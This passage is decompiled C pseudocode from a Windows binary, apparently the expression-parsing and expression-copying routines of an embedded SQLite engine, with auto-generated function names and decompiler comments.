  v4 = (char *)sub_1006A297(a1, *a2);
  v7 = (unsigned int)v4;
  if ( a3 )
  {
    if ( v4 )
    {
      v5 = sub_1006AB10(a2, v4);
      if ( v5 )
      {
        *(_WORD *)(a3 + 2) |= 0x100u;
        *(_DWORD *)(a3 + 20) = v5;
      }
    }
  }
  sub_10058EC7(v3, v7);
  return a3;
}

//----- (1007596F) --------------------------------------------------------
int *__usercall sub_1007596F@<eax>(unsigned __int8 *a1@<eax>, int *a2@<ecx>)
{
  int *v3; // esi
  unsigned __int8 *v5; // edx
  int v6; // eax
  int v7; // ecx
  const char *v9; // [esp+Ch] [ebp-4h]

  v3 = 0;
  v5 = a1;
  if ( a1 )
  {
    while ( 1 )
    {
      v3 = (int *)*((_DWORD *)v5 + 5);
      if ( v3 )
        break;
      v6 = *v5;
      if ( *((_DWORD *)v5 + 10) && (v6 == 154 || v6 == 152 || v6 == 132 || v6 == 60) )
      {
        v7 = *((__int16 *)v5 + 14);
        if ( v7 >= 0 )
        {
          v3 = sub_10069699(
                 *a2,
                 *(_BYTE *)(*(_DWORD *)(*(_DWORD *)(*a2 + 8) + 12) + 73),
                 *(_BYTE **)(*(_DWORD *)(*((_DWORD *)v5 + 10) + 16) + 24 * v7 + 16),
                 0);
          *((_DWORD *)a1 + 5) = v3;
        }
LABEL_14:
        if ( !v3 )
          return v3;
        break;
      }
      if ( v6 != 37 && v6 != 157 )
        goto LABEL_14;
      v5 = (unsigned __int8 *)*((_DWORD *)v5 + 2);
      if ( !v5 )
        return v3;
    }
    v9 = (const char *)*v3;
    if ( !sub_100695A6(v3, *a2, *(_BYTE *)(*(_DWORD *)(*(_DWORD *)(*a2 + 8) + 12) + 73), (_BYTE *)*v3) )
    {
      sub_10059320(a2, "no such collation sequence: %s", v9);
      ++a2[16];
      return 0;
    }
  }
  return v3;
}

//----- (10075A35) --------------------------------------------------------
char __usercall sub_10075A35@<al>(unsigned __int8 *a1@<eax>, char a2@<bl>)
{
  char v2; // al

  v2 = sub_100758D6(a1);
  if ( !v2 )
  {
    if ( !a2 )
      return 98;
    return a2 + v2;
  }
  if ( !a2 )
    return a2 + v2;
  if ( v2 < 99 && a2 < 99 )
    return 98;
  return 99;
}

//----- (10075A58) --------------------------------------------------------
char __usercall sub_10075A58@<al>(int a1@<esi>)
{
  char result; // al
  char v2; // bl
  unsigned __int8 *v3; // eax

  result = sub_100758D6(*(unsigned __int8 **)(a1 + 8));
  if ( *(_DWORD *)(a1 + 12) )
  {
    v2 = result;
    v3 = *(unsigned __int8 **)(a1 + 12);
    return sub_10075A35(v3, v2);
  }
  if ( (*(_WORD *)(a1 + 2) & 0x800) != 0 )
  {
    v2 = result;
    v3 = **(unsigned __int8 ***)(**(_DWORD **)(a1 + 16) + 12);
    return sub_10075A35(v3, v2);
  }
  if ( !result )
    return 98;
  return result;
}

//----- (10075A91) --------------------------------------------------------
int *__usercall sub_10075A91@<eax>(int a1@<eax>, int a2@<esi>, int *a3)
{
  int *result; // eax

  if ( (*(_WORD *)(a1 + 2) & 0x100) != 0 )
    return *(int **)(a1 + 20);
  if ( a2 && (*(_WORD *)(a2 + 2) & 0x100) != 0 )
    return *(int **)(a2 + 20);
  result = sub_1007596F((unsigned __int8 *)a1, a3);
  if ( !result )
    return sub_1007596F((unsigned __int8 *)a2, a3);
  return result;
}

//----- (10075ACC) --------------------------------------------------------
int __usercall sub_10075ACC@<eax>(
        unsigned __int8 *a1@<eax>,
        int a2@<edi>,
        unsigned __int8 *a3,
        char a4,
        int a5,
        int a6,
        int a7,
        char a8)
{
  char v9; // al
  char v10; // bl
  int v11; // eax
  int *v13; // [esp+Ch] [ebp-4h]
  int v14; // [esp+2Ch] [ebp+1Ch]

  v13 = sub_10075A91((int)a3, (int)a1, (int *)a2);
  v9 = sub_100758D6(a1);
  v10 = a8 | sub_10075A35(a3, v9);
  v14 = sub_1005AC02(*(int **)(a2 + 12), a4, a6, a7, a5, (unsigned __int16 *)v13, (_BYTE *)0xFFFFFFFC);
  sub_1005AE0E(*(_DWORD *)(a2 + 12), v10);
  if ( (v10 & 0x67) != 98 )
  {
    v11 = sub_100772A8(a2, 1, a5);
    sub_100772A8(v11, 1, a6);
  }
  return v14;
}

//----- (10075B4A) --------------------------------------------------------
int __usercall sub_10075B4A@<eax>(int *a1@<eax>, int a2)
{
  int v3; // ecx
  int result; // eax

  v3 = *(_DWORD *)(*a1 + 84);
  result = 0;
  if ( a2 > v3 )
  {
    sub_10059320(a1, "Expression tree is too large (maximum depth %d)", v3);
    return 1;
  }
  return result;
}

//----- (10075B6F) --------------------------------------------------------
int *__usercall sub_10075B6F@<eax>(int *result@<eax>, _DWORD *a2@<edi>)
{
  int v2; // esi
  int v3; // edx
  int v4; // ecx
  int v5; // ecx

  if ( result )
  {
    v2 = 0;
    if ( *result > 0 )
    {
      v3 = 0;
      do
      {
        v4 = *(_DWORD *)(v3 + result[3]);
        if ( v4 )
        {
          v5 = *(_DWORD *)(v4 + 44);
          if ( v5 > *a2 )
            *a2 = v5;
        }
        ++v2;
        v3 += 20;
      }
      while ( v2 < *result );
    }
  }
  return result;
}

//----- (10075B99) --------------------------------------------------------
int *__usercall sub_10075B99@<eax>(int *result@<eax>, int a2@<ecx>)
{
  int *v2; // edi
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // eax

  v2 = result;
  while ( a2 )
  {
    v4 = *(_DWORD *)(a2 + 12);
    if ( v4 )
    {
      v5 = *(_DWORD *)(v4 + 44);
      if ( v5 > *v2 )
        *v2 = v5;
    }
    v6 = *(_DWORD *)(a2 + 20);
    if ( v6 )
    {
      v7 = *(_DWORD *)(v6 + 44);
      if ( v7 > *v2 )
        *v2 = v7;
    }
    v8 = *(_DWORD *)(a2 + 40);
    if ( v8 )
    {
      v9 = *(_DWORD *)(v8 + 44);
      if ( v9 > *v2 )
        *v2 = v9;
    }
    v10 = *(_DWORD *)(a2 + 44);
    if ( v10 )
    {
      v11 = *(_DWORD *)(v10 + 44);
      if ( v11 > *v2 )
        *v2 = v11;
    }
    sub_10075B6F(*(int **)a2, v2);
    sub_10075B6F(*(int **)(a2 + 16), v2);
    result = sub_10075B6F(*(int **)(a2 + 24), v2);
    a2 = *(_DWORD *)(a2 + 28);
  }
  return result;
}

//----- (10075C02) --------------------------------------------------------
int __usercall sub_10075C02@<eax>(int a1@<esi>)
{
  int v1; // eax
  int v2; // eax
  int v3; // eax
  int v4; // eax
  int result; // eax
  int v6; // [esp+0h] [ebp-4h] BYREF

  v1 = *(_DWORD *)(a1 + 8);
  v6 = 0;
  if ( v1 )
  {
    v2 = *(_DWORD *)(v1 + 44);
    if ( v2 > 0 )
      v6 = v2;
  }
  v3 = *(_DWORD *)(a1 + 12);
  if ( v3 )
  {
    v4 = *(_DWORD *)(v3 + 44);
    if ( v4 > v6 )
      v6 = v4;
  }
  if ( (*(_WORD *)(a1 + 2) & 0x800) != 0 )
    sub_10075B99(&v6, *(_DWORD *)(a1 + 16));
  else
    sub_10075B6F(*(int **)(a1 + 16), &v6);
  result = v6 + 1;
  *(_DWORD *)(a1 + 44) = v6 + 1;
  return result;
}

//----- (10075C58) --------------------------------------------------------
int __usercall sub_10075C58@<eax>(int a1@<eax>, int *a2)
{
  sub_10075C02(a1);
  return sub_10075B4A(a2, *(_DWORD *)(a1 + 44));
}

//----- (10075C72) --------------------------------------------------------
_DWORD *__usercall sub_10075C72@<eax>(const void **a1@<eax>, int a2, int a3, int a4)
{
  int v4; // ebx
  _BYTE *v6; // eax
  _DWORD *v7; // esi
  int v8; // eax
  int v9; // edi
  int v11; // [esp+10h] [ebp-4h] BYREF

  v4 = 0;
  v11 = 0;
  if ( a1 )
  {
    if ( a3 != 129 || (v6 = *a1) == 0 || !sub_100598E8(v6, &v11) )
      v4 = (int)a1[1] + 1;
  }
  v7 = sub_1005904B(a2, v4 + 48);
  if ( v7 )
  {
    *((_WORD *)v7 + 15) = -1;
    *(_BYTE *)v7 = a3;
    if ( a1 )
    {
      if ( v4 )
      {
        v7[1] = v7 + 12;
        memcpy(v7 + 12, *a1, (size_t)a1[1]);
        *((_BYTE *)a1[1] + v7[1]) = 0;
        if ( a4 )
        {
          if ( v4 >= 3 )
          {
            v9 = *(char *)*a1;
            if ( v9 == 39 || v9 == 34 || v9 == 91 || v9 == 96 )
            {
              sub_10059363((char *)v7[1]);
              if ( v9 == 34 )
                *((_WORD *)v7 + 1) |= 0x40u;
            }
          }
        }
      }
      else
      {
        v8 = v11;
        *((_WORD *)v7 + 1) |= 0x400u;
        v7[1] = v8;
      }
    }
    v7[11] = 1;
  }
  return v7;
}

//----- (10075D3B) --------------------------------------------------------
_DWORD *__cdecl sub_10075D3B(int a1, int a2)
{
  _BYTE *v2; // ecx
  const void *v4; // [esp+0h] [ebp-8h] BYREF
  _BYTE *v5; // [esp+4h] [ebp-4h]

  v4 = v2;
  if ( v2 )
    v5 = sub_10059297(v2);
  else
    v5 = 0;
  return sub_10075C72(&v4, a1, a2, 0);
}
// 10075D42: variable 'v2' is possibly undefined

//----- (10075D6A) --------------------------------------------------------
void __usercall sub_10075D6A(unsigned int a1@<eax>, int a2@<ecx>, unsigned int a3@<edi>, int a4)
{
  if ( a2 )
  {
    if ( a3 )
    {
      *(_DWORD *)(a2 + 12) = a3;
      if ( (*(_WORD *)(a3 + 2) & 0x100) != 0 )
      {
        *(_WORD *)(a2 + 2) |= 0x100u;
        *(_DWORD *)(a2 + 20) = *(_DWORD *)(a3 + 20);
      }
    }
    if ( a1 )
    {
      *(_DWORD *)(a2 + 8) = a1;
      if ( (*(_WORD *)(a1 + 2) & 0x100) != 0 )
      {
        *(_WORD *)(a2 + 2) |= 0x100u;
        *(_DWORD *)(a2 + 20) = *(_DWORD *)(a1 + 20);
      }
    }
    sub_10075C02(a2);
  }
  else
  {
    sub_10075FD8(a4, a1);
    sub_10075FD8(a4, a3);
  }
}

//----- (10075DC6) --------------------------------------------------------
_DWORD *__usercall sub_10075DC6@<eax>(
        const void **a1@<eax>,
        unsigned int a2@<edi>,
        int *a3@<esi>,
        int a4,
        unsigned int a5)
{
  _DWORD *v5; // ebx

  v5 = sub_10075C72(a1, *a3, a4, 1);
  sub_10075D6A(a5, (int)v5, a2, *a3);
  return v5;
}

//----- (10075DEF) --------------------------------------------------------
_DWORD *__usercall sub_10075DEF@<eax>(_DWORD *result@<eax>, int a2, unsigned int a3)
{
  unsigned int v3; // edi
  _DWORD *v4; // esi

  v3 = (unsigned int)result;
  if ( a3 )
  {
    if ( result )
    {
      v4 = sub_10075C72(0, a2, 69, 0);
      sub_10075D6A(a3, (int)v4, v3, a2);
      return v4;
    }
    else
    {
      return (_DWORD *)a3;
    }
  }
  return result;
}

//----- (10075E2C) --------------------------------------------------------
_DWORD *__usercall sub_10075E2C@<eax>(const void **a1@<eax>, int *a2@<ecx>, int *a3)
{
  int v4; // ebx
  _DWORD *v5; // eax
  _DWORD *v6; // esi

  v4 = *a2;
  v5 = sub_10075C72(a1, *a2, 151, 1);
  v6 = v5;
  if ( v5 )
  {
    v5[4] = a3;
    sub_10075C58((int)v5, a2);
    return v6;
  }
  else
  {
    sub_100767B1(a3, v4);
    return 0;
  }
}

//----- (10075E6F) --------------------------------------------------------
__int16 __usercall sub_10075E6F@<ax>(int a1@<eax>, int a2@<ebx>)
{
  int v3; // eax
  char *v4; // ecx
  int v5; // esi
  char *v6; // ecx
  int v7; // esi
  int v8; // eax
  int v9; // eax
  char *v11; // [esp+8h] [ebp-10h]
  _BYTE *Size; // [esp+Ch] [ebp-Ch]
  int v13; // [esp+10h] [ebp-8h]
  int v14; // [esp+14h] [ebp-4h]

  v3 = *(_DWORD *)a1;
  v13 = v3;
  if ( a2 )
  {
    v4 = *(char **)(a2 + 4);
    v11 = v4;
    if ( v4[1] )
    {
      if ( *v4 == 63 )
      {
        v5 = j__atol(v4 + 1);
        *(_WORD *)(a2 + 28) = v5;
        if ( v5 < 1 || v5 > *(_DWORD *)(v13 + 108) )
          sub_10059320((int *)a1, "variable number must be between ?1 and ?%d", *(_DWORD *)(v13 + 108));
        v3 = a1 + 444;
        if ( v5 > *(_DWORD *)(a1 + 444) )
          *(_DWORD *)v3 = v5;
      }
      else
      {
        v14 = 0;
        Size = sub_10059297(v4);
        if ( *(int *)(a1 + 448) > 0 )
        {
          while ( 1 )
          {
            v7 = *(_DWORD *)(*(_DWORD *)(a1 + 456) + 4 * v14);
            if ( !memcmp(*(const void **)(v7 + 4), v6, (size_t)Size) && !Size[*(_DWORD *)(v7 + 4)] )
              break;
            if ( ++v14 >= *(_DWORD *)(a1 + 448) )
              goto LABEL_18;
            v6 = v11;
          }
          *(_WORD *)(a2 + 28) = *(_WORD *)(v7 + 28);
        }
LABEL_18:
        LOWORD(v3) = v14;
        if ( v14 >= *(_DWORD *)(a1 + 448) )
        {
          ++*(_DWORD *)(a1 + 444);
          *(_WORD *)(a2 + 28) = *(_WORD *)(a1 + 444);
          v8 = *(_DWORD *)(a1 + 452);
          if ( *(_DWORD *)(a1 + 448) >= v8 - 1 )
          {
            v9 = 2 * v8 + 10;
            *(_DWORD *)(a1 + 452) = v9;
            *(_DWORD *)(a1 + 456) = sub_10059167(v13, *(void **)(a1 + 456), 4 * v9);
          }
          LOWORD(v3) = v13;
          if ( !*(_BYTE *)(v13 + 30) )
          {
            v3 = *(_DWORD *)(a1 + 448);
            *(_DWORD *)(*(_DWORD *)(a1 + 456) + 4 * v3) = a2;
            ++*(_DWORD *)(a1 + 448);
          }
        }
      }
    }
    else
    {
      ++*(_DWORD *)(a1 + 444);
      LOWORD(v3) = *(_WORD *)(a1 + 444);
      *(_WORD *)(a2 + 28) = v3;
    }
    if ( !*(_DWORD *)(a1 + 64) )
    {
      v3 = *(_DWORD *)(a1 + 444);
      if ( v3 > *(_DWORD *)(v13 + 108) )
        LOWORD(v3) = sub_10059320((int *)a1, aTooManySqlVari);
    }
  }
  return v3;
}
// 10075F1B: variable 'v6' is possibly undefined

//----- (10075FD8) --------------------------------------------------------
void __cdecl sub_10075FD8(int a1, unsigned int a2)
{
  if ( a2 )
  {
    if ( (*(_WORD *)(a2 + 2) & 0x2000) == 0 )
    {
      sub_10075FD8(a1, *(_DWORD *)(a2 + 8));
      sub_10075FD8(a1, *(_DWORD *)(a2 + 12));
      if ( (*(_WORD *)(a2 + 2) & 0x1000) == 0 && (*(_BYTE *)(a2 + 34) & 1) != 0 )
        sub_10058EC7(a1, *(_DWORD *)(a2 + 4));
      if ( (*(_WORD *)(a2 + 2) & 0x800) != 0 )
        sub_1007B016(a1, *(_DWORD *)(a2 + 16));
      else
        sub_100767B1(*(int **)(a2 + 16), a1);
    }
    if ( (*(_WORD *)(a2 + 2) & 0x4000) == 0 )
      sub_10058EC7(a1, a2);
  }
}

//----- (10076053) --------------------------------------------------------
int __usercall sub_10076053@<eax>(_DWORD *a1@<eax>)
{
  bool v1; // zf
  int result; // eax

  if ( a1[2] )
    return 4120;
  if ( a1[3] )
    return 4120;
  if ( a1[5] )
    return 4120;
  v1 = a1[4] == 0;
  result = 8200;
  if ( !v1 )
    return 4120;
  return result;
}

//----- (10076074) --------------------------------------------------------
unsigned int __usercall sub_10076074@<eax>(int a1@<esi>, char a2)
{
  __int16 v2; // ax
  int v3; // edx
  _BYTE *v4; // ecx
  _BYTE *v5; // eax
  int v6; // edx

  if ( (a2 & 1) != 0 )
    v2 = sub_10076053((_DWORD *)a1);
  else
    v2 = 48;
  v3 = v2 & 0xFFF;
  if ( (*(_WORD *)(a1 + 2) & 0x400) == 0 )
  {
    v4 = *(_BYTE **)(a1 + 4);
    if ( v4 )
    {
      v5 = sub_10059297(v4);
      v3 = (int)&v5[v6 + 1];
    }
  }
  return (v3 + 7) & 0xFFFFFFF8;
}
// 100760A7: variable 'v6' is possibly undefined

//----- (100760B3) --------------------------------------------------------
unsigned int __cdecl sub_100760B3(int a1, int a2)
{
  unsigned int v3; // edi
  int v5; // [esp+10h] [ebp+8h]

  v3 = 0;
  if ( a1 )
  {
    v3 = sub_10076074(a1, a2);
    if ( (a2 & 1) != 0 )
    {
      v5 = sub_100760B3(*(_DWORD *)(a1 + 12), a2);
      v3 += sub_100760B3(*(_DWORD *)(a1 + 8), a2) + v5;
    }
  }
  return v3;
}

//----- (100760FA) --------------------------------------------------------
_DWORD *__cdecl sub_100760FA(int a1, void **Src, int a3, void **a4)
{
  void **v4; // ebx
  _DWORD *v5; // edi
  _DWORD *v6; // eax
  int v7; // eax
  __int16 v8; // si
  __int16 v9; // dx
  size_t v10; // eax
  _BYTE *v11; // ecx
  char *v12; // eax
  unsigned __int16 v13; // ax
  _DWORD *v14; // eax
  size_t v16; // [esp-4h] [ebp-2Ch]
  void *v17; // [esp+10h] [ebp-18h] BYREF
  int v18; // [esp+14h] [ebp-14h]
  size_t v19; // [esp+18h] [ebp-10h]
  size_t v20; // [esp+1Ch] [ebp-Ch]
  int v21; // [esp+20h] [ebp-8h]
  size_t Size; // [esp+24h] [ebp-4h]

  v4 = Src;
  v5 = 0;
  if ( Src )
  {
    v18 = a3 & 1;
    v21 = 0;
    if ( a4 )
    {
      v6 = *a4;
      v21 = 0x4000;
    }
    else
    {
      v7 = sub_100760B3((int)Src, a3);
      v6 = sub_10059073(a1, v7);
    }
    v17 = v6;
    v5 = v6;
    if ( v6 )
    {
      if ( v18 )
        v8 = sub_10076053(Src);
      else
        v8 = 48;
      v9 = *((_WORD *)Src + 1);
      v10 = v8 & 0xFFF;
      Size = v10;
      if ( (v9 & 0x400) != 0 || (v11 = Src[1]) == 0 )
      {
        v20 = 0;
      }
      else
      {
        v20 = (size_t)(sub_10059297(v11) + 1);
        v10 = Size;
      }
      if ( v18 )
      {
        memcpy(v17, Src, v10);
      }
      else
      {
        if ( (v9 & 0x2000) != 0 )
          v19 = 8;
        else
          v19 = (v9 & 0x1000) != 4096 ? 48 : 24;
        memcpy(v17, Src, v19);
        memset((char *)v17 + v19, 0, 48 - v19);
      }
      *((_WORD *)v5 + 1) = v21 | *((_WORD *)v5 + 1) & 0x8FFF | v8 & 0x3000;
      if ( v20 )
      {
        v16 = v20;
        v12 = (char *)v17 + Size;
        v5[1] = (char *)v17 + Size;
        memcpy(v12, Src[1], v16);
      }
      v13 = *((_WORD *)Src + 1);
      if ( ((v13 | *((_WORD *)v5 + 1)) & 0x2000) == 0 )
      {
        if ( (v13 & 0x800) != 0 )
        {
          v14 = sub_100765C5(a1, (int)Src[4], v18);
        }
        else
        {
          v14 = (_DWORD *)sub_10076339((int *)Src[4], a1, v18);
          v4 = Src;
        }
        v5[4] = v14;
      }
      if ( (*((_WORD *)v5 + 1) & 0x3000) != 0 )
      {
        v17 = (char *)v17 + sub_10076074((int)v4, a3);
        if ( (*((_WORD *)v5 + 1) & 0x1000) != 0 )
        {
          v5[2] = sub_100760FA(a1, v4[2], 1, (int)&v17);
          v5[3] = sub_100760FA(a1, v4[3], 1, (int)&v17);
        }
        if ( a4 )
          *a4 = v17;
      }
      else
      {
        *((_BYTE *)v5 + 34) = 0;
        if ( (*((_WORD *)v4 + 1) & 0x2000) == 0 )
        {
          v5[2] = sub_100760FA(a1, v4[2], 0, 0);
          v5[3] = sub_100760FA(a1, v4[3], 0, 0);
        }
      }
    }
  }
  return v5;
}
// 100761B2: variable 'v9' is possibly undefined

//----- (1007631C) --------------------------------------------------------
_DWORD *__cdecl sub_1007631C(int a1, void **Src, int a3)
{
  return sub_100760FA(a1, Src, a3, 0);
}

//----- (10076339) --------------------------------------------------------
unsigned int __usercall sub_10076339@<eax>(int *a1@<ebx>, int a2, int a3)
{
  _DWORD *v4; // eax
  int v5; // ecx
  _DWORD *v6; // edi
  int i; // esi
  int v8; // [esp+8h] [ebp-8h]
  unsigned int v9; // [esp+Ch] [ebp-4h]

  if ( !a1 )
    return 0;
  v4 = sub_10059073(a2, 16);
  v9 = (unsigned int)v4;
  if ( !v4 )
    return 0;
  v4[2] = 0;
  v5 = *a1;
  v4[1] = *a1;
  *v4 = v5;
  v6 = sub_10059073(a2, 20 * *a1);
  *(_DWORD *)(v9 + 12) = v6;
  if ( !v6 )
  {
    sub_10058EC7(a2, v9);
    return 0;
  }
  v8 = 0;
  for ( i = a1[3]; v8 < *a1; i += 20 )
  {
    *v6 = sub_100760FA(a2, *(void **)i, a3, 0);
    v6[1] = sub_10059194(*(_BYTE **)(i + 4));
    ++v8;
    v6[2] = sub_10059194(*(_BYTE **)(i + 8));
    *((_BYTE *)v6 + 12) = *(_BYTE *)(i + 12);
    *((_BYTE *)v6 + 13) = 0;
    *((_WORD *)v6 + 7) = *(_WORD *)(i + 14);
    *((_WORD *)v6 + 8) = *(_WORD *)(i + 16);
    v6 += 5;
  }
  return v9;
}

//----- (10076405) --------------------------------------------------------
char *__cdecl sub_10076405(int a1, __int16 *a2, int a3)
{
  char *result; // eax
  int v4; // eax
  __int16 v5; // cx
  char *v6; // edi
  _WORD *v7; // esi
  int v8; // eax
  int v9; // [esp+Ch] [ebp-Ch]
  int v10; // [esp+10h] [ebp-8h]
  char *v11; // [esp+14h] [ebp-4h]

  if ( !a2 )
    return 0;
  v4 = *a2 <= 0 ? 0 : 56 * (*a2 - 1);
  result = (char *)sub_10059073(a1, v4 + 64);
  v11 = result;
  if ( !result )
    return 0;
  v5 = *a2;
  v10 = 0;
  *((_WORD *)result + 1) = *a2;
  *(_WORD *)result = v5;
  if ( *a2 > 0 )
  {
    v9 = (char *)a2 - result;
    v6 = (char *)a2 + 29;
    v7 = result + 12;
    do
    {
      *((_DWORD *)v7 - 1) = sub_10059194(*(_BYTE **)(v6 - 21));
      *(_DWORD *)v7 = sub_10059194(*(_BYTE **)((char *)v7 + v9));
      *((_DWORD *)v7 + 1) = sub_10059194(*(_BYTE **)(v6 - 13));
      *((_BYTE *)v7 + 17) = *v6;
      *((_DWORD *)v7 + 5) = *(_DWORD *)(v6 + 3);
      *((_BYTE *)v7 + 16) = *(v6 - 1);
      *((_DWORD *)v7 + 11) = sub_10059194(*(_BYTE **)(v6 + 27));
      *((_BYTE *)v7 + 18) = v6[1];
      *((_DWORD *)v7 + 12) = *(_DWORD *)(v6 + 31);
      v8 = *(_DWORD *)(v6 - 9);
      *((_DWORD *)v7 + 2) = v8;
      if ( v8 )
        ++*(_WORD *)(v8 + 32);
      *((_DWORD *)v7 + 3) = sub_100765C5(a1, *(_DWORD *)(v6 - 5), a3);
      *((_DWORD *)v7 + 6) = sub_100760FA(a1, *(void **)(v6 + 7), a3, 0);
      *((_DWORD *)v7 + 7) = sub_1007653B(*(_DWORD **)(v6 + 11), a1);
      *((_DWORD *)v7 + 9) = *(_DWORD *)(v6 + 19);
      *((_DWORD *)v7 + 10) = *(_DWORD *)(v6 + 23);
      ++v10;
      v7 += 28;
      v6 += 56;
    }
    while ( v10 < *a2 );
    return v11;
  }
  return result;
}
// 100765C5: using guessed type _DWORD __cdecl sub_100765C5(_DWORD, _DWORD, _DWORD);

//----- (1007653B) --------------------------------------------------------
_DWORD *__usercall sub_1007653B@<eax>(_DWORD *a1@<ebx>, int a2)
{
  _DWORD *v3; // edi
  int v4; // eax
  _DWORD *v5; // eax
  int v6; // esi
  _DWORD *v7; // edi
  _DWORD *v8; // [esp+Ch] [ebp-8h]
  int i; // [esp+10h] [ebp-4h]

  if ( !a1 )
    return 0;
  v3 = sub_10059073(a2, 12);
  v8 = v3;
  if ( !v3 )
    return 0;
  v4 = a1[1];
  v3[2] = v4;
  v3[1] = v4;
  v5 = sub_10059073(a2, 8 * a1[1]);
  *v3 = v5;
  if ( !v5 )
  {
    sub_10058EC7(a2, (unsigned int)v3);
    return 0;
  }
  for ( i = 0; i < a1[1]; v3 = v8 )
  {
    v6 = 8 * i + *a1;
    v7 = (_DWORD *)(8 * i++ + *v3);
    *v7 = sub_10059194(*(_BYTE **)v6);
    v7[1] = *(_DWORD *)(v6 + 4);
  }
  return v3;
}

//----- (100765C5) --------------------------------------------------------
_DWORD *__cdecl sub_100765C5(int a1, int a2, int a3)
{
  _DWORD *v4; // esi
  __int16 v5; // ax

  if ( !a2 )
    return 0;
  v4 = sub_10059073(a1, 68);
  if ( !v4 )
    return 0;
  *v4 = sub_10076339(*(int **)a2, a1, a3);
  v4[2] = sub_10076405(a1, *(__int16 **)(a2 + 8), a3);
  v4[3] = sub_100760FA(a1, *(void **)(a2 + 12), a3, 0);
  v4[4] = sub_10076339(*(int **)(a2 + 16), a1, a3);
  v4[5] = sub_100760FA(a1, *(void **)(a2 + 20), a3, 0);
  v4[6] = sub_10076339(*(int **)(a2 + 24), a1, a3);
  *((_BYTE *)v4 + 4) = *(_BYTE *)(a2 + 4);
  v4[7] = sub_100765C5(a1, *(_DWORD *)(a2 + 28), a3);
  v4[10] = sub_100760FA(a1, *(void **)(a2 + 40), a3, 0);
  v4[11] = sub_100760FA(a1, *(void **)(a2 + 44), a3, 0);
  v4[12] = 0;
  v4[13] = 0;
  v5 = *(_WORD *)(a2 + 6);
  v4[14] = -1;
  v4[15] = -1;
  v4[16] = -1;
  *((_WORD *)v4 + 3) = v5 & 0xFFF7;
  v4[9] = 0;
  return v4;
}

//----- (100766CA) --------------------------------------------------------
int *__usercall sub_100766CA@<eax>(int *a1@<eax>, int *a2@<ecx>, unsigned int a3@<ebx>)
{
  int v3; // esi
  int *v4; // edi
  int v5; // eax
  _DWORD *v6; // eax
  unsigned int *v8; // esi

  v3 = *a1;
  v4 = a2;
  if ( !a2 )
  {
    v4 = sub_1005904B(v3, 0x10u);
    if ( !v4 )
      goto LABEL_5;
  }
  v5 = v4[1];
  if ( v5 <= *v4 )
  {
    v6 = sub_100590DA(v3, (void *)v4[3], 20 * (2 * v5 + 4));
    if ( !v6 )
    {
LABEL_5:
      sub_10075FD8(v3, a3);
      sub_100767B1(v4, v3);
      return 0;
    }
    v4[3] = (int)v6;
    v4[1] = sub_10058E55((unsigned int)v6) / 0x14u;
  }
  v8 = (unsigned int *)(v4[3] + 20 * (*v4)++);
  memset(v8, 0, 0x14u);
  *v8 = a3;
  return v4;
}

//----- (1007674E) --------------------------------------------------------
char *__usercall sub_1007674E@<eax>(char *result@<eax>, int a2@<ecx>, int *a3, int a4)
{
  int v4; // esi

  if ( result )
  {
    v4 = 20 * *(_DWORD *)result + *((_DWORD *)result + 3) - 20;
    result = (char *)sub_100591D0(*a3, *(_DWORD *)(a2 + 4), *(void **)a2);
    *(_DWORD *)(v4 + 4) = result;
    if ( a4 )
    {
      if ( result )
        return (char *)sub_10059363(result);
    }
  }
  return result;
}

//----- (1007678C) --------------------------------------------------------
_DWORD *__usercall sub_1007678C@<eax>(_DWORD *result@<eax>, int *a2@<ecx>, const char *a3)
{
  if ( result )
  {
    result = (_DWORD *)*result;
    if ( (int)result > *(_DWORD *)(*a2 + 80) )
      return (_DWORD *)sub_10059320(a2, "too many columns in %s", a3);
  }
  return result;
}

//----- (100767B1) --------------------------------------------------------
void __usercall sub_100767B1(int *a1@<edi>, int a2)
{
  int v2; // ebx
  _DWORD *v3; // esi

  v2 = 0;
  if ( a1 )
  {
    v3 = (_DWORD *)a1[3];
    if ( *a1 > 0 )
    {
      do
      {
        sub_10075FD8(a2, *v3);
        sub_10058EC7(a2, v3[1]);
        sub_10058EC7(a2, v3[2]);
        ++v2;
        v3 += 5;
      }
      while ( v2 < *a1 );
    }
    sub_10058EC7(a2, a1[3]);
    sub_10058EC7(a2, (unsigned int)a1);
  }
}
// 10075FD8: using guessed type _DWORD __cdecl sub_10075FD8(_DWORD, _DWORD);

//----- (10076809) --------------------------------------------------------
int __cdecl sub_10076809(int a1, unsigned __int8 *a2)
{
  int v2; // ecx
  unsigned __int8 v3; // al

  v2 = *(_DWORD *)(a1 + 12);
  if ( v2 == 3 && (a2[2] & 1) != 0 )
    goto LABEL_7;
  v3 = *a2;
  if ( *a2 == 26 )
    goto LABEL_7;
  if ( v3 == 0x97 )
  {
    if ( v2 != 2 )
    {
LABEL_7:
      *(_DWORD *)(a1 + 12) = 0;
      return 2;
    }
  }
  else if ( v3 > 0x97u && v3 <= 0x9Au )
  {
    goto LABEL_7;
  }
  return 0;
}

//----- (10076842) --------------------------------------------------------
int __cdecl sub_10076842(int a1)
{
  *(_DWORD *)(a1 + 12) = 0;
  return 2;
}

//----- (10076851) --------------------------------------------------------
void __cdecl __spoils<edx,ecx> sub_10076851(int a1)
{
  int (__cdecl *v1[3])(_DWORD, int); // [esp+0h] [ebp-10h] BYREF

  v1[0] = (int (__cdecl *)(_DWORD, int))sub_10076809;
  v1[1] = (int (__cdecl *)(_DWORD, int))sub_10076842;
  sub_10084F0D(v1, a1);
}

//----- (1007687B) --------------------------------------------------------
int __cdecl sub_1007687B(int a1, int *a2)
{
  int v2; // esi
  int v3; // edi
  int v5; // eax
  int *v6; // eax

  v2 = a1;
  v3 = 0;
  if ( (*(_WORD *)(a1 + 2) & 0x400) != 0 )
  {
    *a2 = *(_DWORD *)(a1 + 4);
    return 1;
  }
  if ( *(unsigned __int8 *)a1 == 129 )
  {
    v5 = sub_100598E8(*(_BYTE **)(a1 + 4), a2);
LABEL_10:
    v3 = v5;
    if ( v5 )
      goto LABEL_11;
    return v3;
  }
  if ( *(unsigned __int8 *)a1 != 156 )
  {
    if ( *(unsigned __int8 *)a1 != 157 )
      return v3;
    v5 = sub_1007687B(*(_DWORD *)(a1 + 8), a2);
    goto LABEL_10;
  }
  if ( sub_1007687B(*(_DWORD *)(a1 + 8), &a1) )
  {
    *a2 = -a1;
    v3 = 1;
LABEL_11:
    v6 = a2;
    *(_WORD *)(v2 + 2) |= 0x400u;
    *(_BYTE *)v2 = -127;
    *(_DWORD *)(v2 + 4) = *v6;
  }
